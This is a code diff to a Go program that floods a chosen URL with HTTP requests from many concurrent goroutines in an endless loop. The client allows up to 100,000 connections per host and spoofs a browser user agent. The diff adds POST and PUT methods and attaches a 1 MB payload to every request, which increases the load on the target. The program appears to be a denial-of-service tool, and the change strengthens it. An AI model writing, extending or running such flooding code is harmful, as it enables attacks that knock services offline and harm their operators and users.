@@ -14,7 +14,7 @@ import (
 
 func main() {
 	reader := bufio.NewReader(os.Stdin)
-	fmt.Print("Enter HTTP method (HEAD or GET): ")
+	fmt.Print("Enter HTTP method (HEAD, GET, POST, PUT): ")
 	methodBytes, _, _ := reader.ReadLine()
 	method := strings.ToUpper(strings.TrimSpace(string(methodBytes)))
 
@@ -36,6 +36,8 @@ func main() {
 		MaxConnsPerHost:     100000,
 	}
 
+	largePayload := strings.Repeat("a", 1<<20) // 1 MB payload
+
 	for i := 0; i < numThreads; i++ {
 		go func() {
 			defer wg.Done()
@@ -45,7 +47,10 @@ func main() {
 			req.Header.SetMethod(method)
 			req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
 			req.SetRequestURI(url)
-            req.SetConnectionClose() // Disable keep-alive
+
+			if method == "POST" || method == "PUT" {
+				req.SetBodyString(largePayload)
+			}
 
 			for {
 				client.Do(req, nil)
